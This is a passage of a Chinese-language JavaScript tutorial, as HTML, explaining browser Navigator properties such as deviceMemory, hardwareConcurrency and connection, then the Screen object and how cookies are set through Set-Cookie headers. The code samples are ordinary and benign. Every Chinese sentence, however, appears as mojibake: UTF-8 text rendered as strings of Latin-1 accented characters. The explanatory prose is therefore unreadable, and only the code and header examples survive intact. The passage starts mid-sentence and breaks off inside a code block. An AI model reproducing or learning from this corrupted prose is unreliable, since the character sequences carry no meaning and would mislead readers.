å¯¹è±¡æä¾›ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ã€‚</p><ul><li>Geolocation.getCurrentPosition()ï¼šå¾—åˆ°ç”¨æˆ·çš„å½“å‰ä½ç½®</li><li>Geolocation.watchPosition()ï¼šç›‘å¬ç”¨æˆ·ä½ç½®å˜åŒ–</li><li>Geolocation.clearWatch()ï¼šå–æ¶ˆ<code>watchPosition()</code>æ–¹æ³•æŒ‡å®šçš„ç›‘å¬å‡½æ•°</li></ul><p>æ³¨æ„ï¼Œè°ƒç”¨è¿™ä¸‰ä¸ªæ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·ç»™äºˆæˆæƒã€‚</p><h4 id="navigator-cookieenabled" tabindex="-1"><a class="header-anchor" href="#navigator-cookieenabled" aria-hidden="true">#</a> Navigator.cookieEnabled</h4><p><code>navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„ Cookie åŠŸèƒ½æ˜¯å¦æ‰“å¼€ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>cookieEnabled <span class="token comment">// true</span>
</code></pre></div><p>æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§åæ˜ çš„æ˜¯æµè§ˆå™¨æ€»çš„ç‰¹æ€§ï¼Œä¸æ˜¯å¦å‚¨å­˜æŸä¸ªå…·ä½“çš„ç½‘ç«™çš„ Cookie æ— å…³ã€‚ç”¨æˆ·å¯ä»¥è®¾ç½®æŸä¸ªç½‘ç«™ä¸å¾—å‚¨å­˜ Cookieï¼Œè¿™æ—¶<code>cookieEnabled</code>è¿”å›çš„è¿˜æ˜¯<code>true</code>ã€‚</p><h3 id="navigator-å¯¹è±¡çš„æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#navigator-å¯¹è±¡çš„æ–¹æ³•" aria-hidden="true">#</a> Navigator å¯¹è±¡çš„æ–¹æ³•</h3><h4 id="navigator-javaenabled" tabindex="-1"><a class="header-anchor" href="#navigator-javaenabled" aria-hidden="true">#</a> Navigator.javaEnabled()</h4><p><code>navigator.javaEnabled()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦èƒ½è¿è¡Œ Java Applet å°ç¨‹åºã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span><span class="token function">javaEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// false</span>
</code></pre></div><h4 id="navigator-sendbeacon" tabindex="-1"><a class="header-anchor" href="#navigator-sendbeacon" aria-hidden="true">#</a> Navigator.sendBeacon()</h4><p><code>Navigator.sendBeacon()</code>æ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨å¼‚æ­¥å‘é€æ•°æ®ï¼Œè¯¦è§ã€ŠXMLHttpRequest å¯¹è±¡ã€‹ä¸€ç« ã€‚</p><h3 id="navigator-çš„å®éªŒæ€§å±æ€§" tabindex="-1"><a class="header-anchor" href="#navigator-çš„å®éªŒæ€§å±æ€§" aria-hidden="true">#</a> Navigator çš„å®éªŒæ€§å±æ€§</h3><p>Navigator å¯¹è±¡æœ‰ä¸€äº›å®éªŒæ€§å±æ€§ï¼Œåœ¨éƒ¨åˆ†æµè§ˆå™¨å¯ç”¨ã€‚</p><h4 id="navigator-devicememory" tabindex="-1"><a class="header-anchor" href="#navigator-devicememory" aria-hidden="true">#</a> Navigator.deviceMemory</h4><p><code>navigator.deviceMemory</code>å±æ€§è¿”å›å½“å‰è®¡ç®—æœºçš„å†…å­˜æ•°é‡ï¼ˆå•ä½ä¸º GBï¼‰ã€‚è¯¥å±æ€§åªè¯»ï¼Œåªåœ¨ HTTPS ç¯å¢ƒä¸‹å¯ç”¨ã€‚</p><p>å®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªè¿‘ä¼¼å€¼ï¼Œå››èˆäº”å…¥åˆ°æœ€æ¥è¿‘çš„2çš„å¹‚ï¼Œé€šå¸¸æ˜¯ 0.25ã€0.5ã€1ã€2ã€4ã€8ã€‚å®é™…å†…å­˜è¶…è¿‡ 8GBï¼Œä¹Ÿè¿”å›<code>8</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>deviceMemory <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">&#39;./costly-module.js&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œåªæœ‰å½“å‰å†…å­˜å¤§äº 1GBï¼Œæ‰åŠ è½½å¤§å‹çš„è„šæœ¬ã€‚</p><h4 id="navigator-hardwareconcurrency" tabindex="-1"><a class="header-anchor" href="#navigator-hardwareconcurrency" aria-hidden="true">#</a> Navigator.hardwareConcurrency</h4><p><code>navigator.hardwareConcurrency</code>å±æ€§è¿”å›ç”¨æˆ·è®¡ç®—æœºä¸Šå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨çš„æ•°é‡ã€‚è¯¥å±æ€§åªè¯»ã€‚</p><p>ç°ä»£è®¡ç®—æœºçš„ CPU æœ‰å¤šä¸ªç‰©ç†æ ¸å¿ƒï¼Œæ¯ä¸ªç‰©ç†æ ¸å¿ƒæœ‰æ—¶æ”¯æŒä¸€æ¬¡è¿è¡Œå¤šä¸ªçº¿ç¨‹ã€‚å› æ­¤ï¼Œå››æ ¸ CPU å¯ä»¥æä¾›å…«ä¸ªé€»è¾‘å¤„ç†å™¨æ ¸å¿ƒã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>hardwareConcurrency <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">&#39;./costly-module.js&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨å¤§äº4ï¼Œæ‰ä¼šåŠ è½½å¤§å‹è„šæœ¬ã€‚</p><p>è¯¥å±æ€§é€šè¿‡ç”¨äºåˆ›å»º Web Workerï¼Œæ¯ä¸ªå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨éƒ½åˆ›å»ºä¸€ä¸ª Workerã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">let</span> workerList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>hardwareConcurrency<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> newWorker <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">worker</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">&#39;cpuworker.js&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">inUse</span><span class="token operator">:</span> <span class="token boolean">false</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  workerList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newWorker<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨ï¼Œå°±åˆ›å»ºå¤šå°‘ä¸ª Web Workerã€‚</p><h4 id="navigator-connection" tabindex="-1"><a class="header-anchor" href="#navigator-connection" aria-hidden="true">#</a> Navigator.connection</h4><p><code>navigator.connection</code>å±æ€§è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«å½“å‰ç½‘ç»œè¿æ¥çš„ç›¸å…³ä¿¡æ¯ã€‚</p><ul><li>downlinkï¼šæœ‰æ•ˆå¸¦å®½ä¼°è®¡å€¼ï¼ˆå•ä½ï¼šå…†æ¯”ç‰¹/ç§’ï¼ŒMbpsï¼‰ï¼Œå››èˆäº”å…¥åˆ°æ¯ç§’ 25KB çš„æœ€æ¥è¿‘å€æ•°ã€‚</li><li>downlinkMaxï¼šå½“å‰è¿æ¥çš„æœ€å¤§ä¸‹è¡Œé“¾è·¯é€Ÿåº¦ï¼ˆå•ä½ï¼šå…†æ¯”ç‰¹æ¯ç§’ï¼ŒMbpsï¼‰ã€‚</li><li>effectiveTypeï¼šè¿”å›è¿æ¥çš„ç­‰æ•ˆç±»å‹ï¼Œå¯èƒ½çš„å€¼ä¸º<code>slow-2g</code>ã€<code>2g</code>ã€<code>3g</code>ã€<code>4g</code>ã€‚</li><li>rttï¼šå½“å‰è¿æ¥çš„ä¼°è®¡æœ‰æ•ˆå¾€è¿”æ—¶é—´ï¼Œå››èˆäº”å…¥åˆ°æœ€æ¥è¿‘çš„25æ¯«ç§’çš„å€æ•°ã€‚</li><li>saveDataï¼šç”¨æˆ·æ˜¯å¦è®¾ç½®äº†æµè§ˆå™¨çš„å‡å°‘æ•°æ®ä½¿ç”¨é‡é€‰é¡¹ï¼ˆæ¯”å¦‚ä¸åŠ è½½å›¾ç‰‡ï¼‰ï¼Œè¿”å›<code>true</code>æˆ–è€…<code>false</code>ã€‚</li><li>typeï¼šå½“å‰è¿æ¥çš„ä»‹è´¨ç±»å‹ï¼Œå¯èƒ½çš„å€¼ä¸º<code>bluetooth</code>ã€<code>cellular</code>ã€<code>ethernet</code>ã€<code>none</code>ã€<code>wifi</code>ã€<code>wimax</code>ã€<code>other</code>ã€<code>unknown</code>ã€‚</li></ul><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>effectiveType <span class="token operator">===</span> <span class="token string">&#39;4g&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">&#39;./costly-module.js&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œå¦‚æœç½‘ç»œè¿æ¥æ˜¯ 4Gï¼Œåˆ™åŠ è½½å¤§å‹è„šæœ¬ã€‚</p><h3 id="screen-å¯¹è±¡" tabindex="-1"><a class="header-anchor" href="#screen-å¯¹è±¡" aria-hidden="true">#</a> Screen å¯¹è±¡</h3><p>Screen å¯¹è±¡è¡¨ç¤ºå½“å‰çª—å£æ‰€åœ¨çš„å±å¹•ï¼Œæä¾›æ˜¾ç¤ºè®¾å¤‡çš„ä¿¡æ¯ã€‚<code>window.screen</code>å±æ€§æŒ‡å‘è¿™ä¸ªå¯¹è±¡ã€‚</p><p>è¯¥å¯¹è±¡æœ‰ä¸‹é¢çš„å±æ€§ã€‚</p><ul><li><code>Screen.height</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚é™¤éè°ƒæ•´æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ï¼Œå¦åˆ™è¿™ä¸ªå€¼å¯ä»¥çœ‹ä½œå¸¸é‡ï¼Œä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ä¸æµè§ˆå™¨è®¾ç½®æ— å…³ï¼Œç¼©æ”¾ç½‘é¡µå¹¶ä¸ä¼šæ”¹å˜åˆ†è¾¨ç‡ã€‚</li><li><code>Screen.width</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li><li><code>Screen.availHeight</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å› ä¸ºéƒ¨åˆ†ç©ºé—´å¯èƒ½ä¸å¯ç”¨ï¼Œæ¯”å¦‚ç³»ç»Ÿçš„ä»»åŠ¡æ æˆ–è€… Mac ç³»ç»Ÿå±å¹•åº•éƒ¨çš„ Dock åŒºï¼Œè¿™ä¸ªå±æ€§ç­‰äº<code>height</code>å‡å»é‚£äº›è¢«ç³»ç»Ÿç»„ä»¶çš„é«˜åº¦ã€‚</li><li><code>Screen.availWidth</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li><li><code>Screen.pixelDepth</code>ï¼šæ•´æ•°ï¼Œè¡¨ç¤ºå±å¹•çš„è‰²å½©ä½æ•°ï¼Œæ¯”å¦‚<code>24</code>è¡¨ç¤ºå±å¹•æä¾›24ä½è‰²å½©ã€‚</li><li><code>Screen.colorDepth</code>ï¼š<code>Screen.pixelDepth</code>çš„åˆ«åã€‚ä¸¥æ ¼åœ°è¯´ï¼ŒcolorDepth è¡¨ç¤ºåº”ç”¨ç¨‹åºçš„é¢œè‰²æ·±åº¦ï¼ŒpixelDepth è¡¨ç¤ºå±å¹•çš„é¢œè‰²æ·±åº¦ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä»¬éƒ½æ˜¯åŒä¸€ä»¶äº‹ã€‚</li><li><code>Screen.orientation</code>ï¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•çš„æ–¹å‘ã€‚è¯¥å¯¹è±¡çš„<code>type</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±å¹•çš„å…·ä½“æ–¹å‘ï¼Œ<code>landscape-primary</code>è¡¨ç¤ºæ¨ªæ”¾ï¼Œ<code>landscape-secondary</code>è¡¨ç¤ºé¢ å€’çš„æ¨ªæ”¾ï¼Œ<code>portrait-primary</code>è¡¨ç¤ºç«–æ”¾ï¼Œ<code>portrait-secondary</code>è¡¨ç¤ºé¢ å€’çš„ç«–æ”¾ã€‚</li></ul><p>ä¸‹é¢æ˜¯<code>Screen.orientation</code>çš„ä¾‹å­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>orientation
<span class="token comment">// { angle: 0, type: &quot;landscape-primary&quot;, onchange: null }</span>
</code></pre></div><p>ä¸‹é¢çš„ä¾‹å­ä¿è¯å±å¹•åˆ†è¾¨ç‡å¤§äº 1024 x 768ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">&gt;=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">&gt;=</span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// åˆ†è¾¨ç‡ä¸ä½äº 1024x768</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸‹é¢æ˜¯æ ¹æ®å±å¹•çš„å®½åº¦ï¼Œå°†ç”¨æˆ·å¯¼å‘ä¸åŒç½‘é¡µçš„ä»£ç ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>screen<span class="token punctuation">.</span>width <span class="token operator">&lt;=</span> <span class="token number">800</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>screen<span class="token punctuation">.</span>height <span class="token operator">&lt;=</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">&#39;small.html&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">&#39;wide.html&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h2 id="cookie" tabindex="-1"><a class="header-anchor" href="#cookie" aria-hidden="true">#</a> Cookie</h2><h3 id="æ¦‚è¿°-1" tabindex="-1"><a class="header-anchor" href="#æ¦‚è¿°-1" aria-hidden="true">#</a> æ¦‚è¿°</h3><p>Cookie æ˜¯æœåŠ¡å™¨ä¿å­˜åœ¨æµè§ˆå™¨çš„ä¸€å°æ®µæ–‡æœ¬ä¿¡æ¯ï¼Œä¸€èˆ¬å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚æµè§ˆå™¨æ¯æ¬¡å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é™„ä¸Šè¿™æ®µä¿¡æ¯ã€‚</p><p>Cookie ä¸»è¦ä¿å­˜çŠ¶æ€ä¿¡æ¯ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¸»è¦ç”¨é€”ã€‚</p><ul><li>å¯¹è¯ï¼ˆsessionï¼‰ç®¡ç†ï¼šä¿å­˜ç™»å½•ã€è´­ç‰©è½¦ç­‰éœ€è¦è®°å½•çš„ä¿¡æ¯ã€‚</li><li>ä¸ªæ€§åŒ–ä¿¡æ¯ï¼šä¿å­˜ç”¨æˆ·çš„åå¥½ï¼Œæ¯”å¦‚ç½‘é¡µçš„å­—ä½“å¤§å°ã€èƒŒæ™¯è‰²ç­‰ç­‰ã€‚</li><li>è¿½è¸ªç”¨æˆ·ï¼šè®°å½•å’Œåˆ†æç”¨æˆ·è¡Œä¸ºã€‚</li></ul><p>Cookie ä¸æ˜¯ä¸€ç§ç†æƒ³çš„å®¢æˆ·ç«¯å‚¨å­˜æœºåˆ¶ã€‚å®ƒçš„å®¹é‡å¾ˆå°ï¼ˆ4KBï¼‰ï¼Œç¼ºä¹æ•°æ®æ“ä½œæ¥å£ï¼Œè€Œä¸”ä¼šå½±å“æ€§èƒ½ã€‚å®¢æˆ·ç«¯å‚¨å­˜åº”è¯¥ä½¿ç”¨ Web storage API å’Œ IndexedDBã€‚åªæœ‰é‚£äº›æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è®©æœåŠ¡å™¨çŸ¥é“çš„ä¿¡æ¯ï¼Œæ‰åº”è¯¥æ”¾åœ¨ Cookie é‡Œé¢ã€‚</p><p>æ¯ä¸ª Cookie éƒ½æœ‰ä»¥ä¸‹å‡ æ–¹é¢çš„å…ƒæ•°æ®ã€‚</p><ul><li>Cookie çš„åå­—</li><li>Cookie çš„å€¼ï¼ˆçœŸæ­£çš„æ•°æ®å†™åœ¨è¿™é‡Œé¢ï¼‰</li><li>åˆ°æœŸæ—¶é—´ï¼ˆè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå¤±æ•ˆï¼‰</li><li>æ‰€å±åŸŸåï¼ˆé»˜è®¤ä¸ºå½“å‰åŸŸåï¼‰</li><li>ç”Ÿæ•ˆçš„è·¯å¾„ï¼ˆé»˜è®¤ä¸ºå½“å‰ç½‘å€ï¼‰</li></ul><p>ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è®¿é—®ç½‘å€<code>www.example.com</code>ï¼ŒæœåŠ¡å™¨åœ¨æµè§ˆå™¨å†™å…¥ä¸€ä¸ª Cookieã€‚è¿™ä¸ª Cookie çš„æ‰€å±åŸŸåä¸º<code>www.example.com</code>ï¼Œç”Ÿæ•ˆè·¯å¾„ä¸ºæ ¹è·¯å¾„<code>/</code>ã€‚å¦‚æœ Cookie çš„ç”Ÿæ•ˆè·¯å¾„è®¾ä¸º<code>/forums</code>ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie åªæœ‰åœ¨è®¿é—®<code>www.example.com/forums</code>åŠå…¶å­è·¯å¾„æ—¶æ‰æœ‰æ•ˆã€‚ä»¥åï¼Œæµè§ˆå™¨è®¿é—®æŸä¸ªè·¯å¾„ä¹‹å‰ï¼Œå°±ä¼šæ‰¾å‡ºå¯¹è¯¥åŸŸåå’Œè·¯å¾„æœ‰æ•ˆï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰åˆ°æœŸçš„ Cookieï¼Œä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚</p><p>ç”¨æˆ·å¯ä»¥è®¾ç½®æµè§ˆå™¨ä¸æ¥å— Cookieï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸å‘æœåŠ¡å™¨å‘é€ Cookieã€‚<code>window.navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>cookieEnabled <span class="token comment">// true</span>
</code></pre></div><p><code>document.cookie</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µçš„ Cookieã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token comment">// &quot;id=foo;key=bar&quot;</span>
</code></pre></div><p>ä¸åŒæµè§ˆå™¨å¯¹ Cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸåè®¾ç½®çš„ Cookie ä¸åº”è¶…è¿‡30ä¸ªï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼ŒCookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®ã€‚</p><p>æµè§ˆå™¨çš„åŒæºæ”¿ç­–è§„å®šï¼Œä¸¤ä¸ªç½‘å€åªè¦åŸŸåç›¸åŒï¼Œå°±å¯ä»¥å…±äº« Cookieï¼ˆå‚è§ã€ŠåŒæºæ”¿ç­–ã€‹ä¸€ç« ï¼‰ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¸è¦æ±‚åè®®ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>http://example.com</code>è®¾ç½®çš„ Cookieï¼Œå¯ä»¥è¢«<code>https://example.com</code>è¯»å–ã€‚</p><h3 id="cookie-ä¸-http-åè®®" tabindex="-1"><a class="header-anchor" href="#cookie-ä¸-http-åè®®" aria-hidden="true">#</a> Cookie ä¸ HTTP åè®®</h3><p>Cookie ç”± HTTP åè®®ç”Ÿæˆï¼Œä¹Ÿä¸»è¦æ˜¯ä¾› HTTP åè®®ä½¿ç”¨ã€‚</p><h4 id="http-å›åº”-cookie-çš„ç”Ÿæˆ" tabindex="-1"><a class="header-anchor" href="#http-å›åº”-cookie-çš„ç”Ÿæˆ" aria-hidden="true">#</a> HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ</h4><p>æœåŠ¡å™¨å¦‚æœå¸Œæœ›åœ¨æµè§ˆå™¨ä¿å­˜ Cookieï¼Œå°±è¦åœ¨ HTTP å›åº”çš„å¤´ä¿¡æ¯é‡Œé¢ï¼Œæ”¾ç½®ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie:foo=bar
</code></pre></div><p>ä¸Šé¢ä»£ç ä¼šåœ¨æµè§ˆå™¨ä¿å­˜ä¸€ä¸ªåä¸º<code>foo</code>çš„ Cookieï¼Œå®ƒçš„å€¼ä¸º<code>bar</code>ã€‚</p><p>HTTP å›åº”å¯ä»¥åŒ…å«å¤šä¸ª<code>Set-Cookie</code>å­—æ®µï¼Œå³åœ¨æµè§ˆå™¨ç”Ÿæˆå¤šä¸ª Cookieã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre></div><p>é™¤äº† Cookie çš„å€¼ï¼Œ<code>Set-Cookie</code>å­—æ®µè¿˜å¯ä»¥é™„åŠ  Cookie çš„å±æ€§ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
</code></pre></div><p>ä¸Šé¢çš„å‡ ä¸ªå±æ€§çš„å«ä¹‰ï¼Œå°†åœ¨åæ–‡è§£é‡Šã€‚</p><p>ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µé‡Œé¢ï¼Œå¯ä»¥åŒæ—¶åŒ…æ‹¬å¤šä¸ªå±æ€§ï¼Œæ²¡æœ‰æ¬¡åºçš„è¦æ±‚ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
</code></pre></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><p>å¦‚æœæœåŠ¡å™¨æƒ³æ”¹å˜ä¸€ä¸ªæ—©å…ˆè®¾ç½®çš„ Cookieï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šCookie çš„<code>key</code>ã€<code>domain</code>ã€<code>path</code>å’Œ<code>secure</code>éƒ½åŒ¹é…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåŸå§‹çš„ Cookie æ˜¯ç”¨å¦‚ä¸‹çš„<code>Set-Cookie</code>è®¾ç½®çš„ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: key1=value1; domain=example.com; path=/blog
</code></pre></div><p>æ”¹å˜ä¸Šé¢è¿™ä¸ª Cookie çš„å€¼ï¼Œå°±å¿…é¡»ä½¿ç”¨åŒæ ·çš„<code>Set-Cookie</code>ã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/blog
</code></pre></div><p>åªè¦æœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„ Cookieï¼Œè€Œä¸æ˜¯æ›¿æ¢æ‰åŸæ¥é‚£ä¸ª Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/
</code></pre></div><p>ä¸Šé¢çš„å‘½ä»¤è®¾ç½®äº†ä¸€ä¸ªå…¨æ–°çš„åŒå Cookieï¼Œä½†æ˜¯<code>path</code>å±æ€§ä¸ä¸€æ ·ã€‚ä¸‹ä¸€æ¬¡è®¿é—®<code>example.com/blog</code>çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨å‘é€ä¸¤ä¸ªåŒåçš„ Cookieã€‚</p><div class="language-text" data-ext="text"><pre class="language-text"><code>Cookie: key1=value1; key1=value2
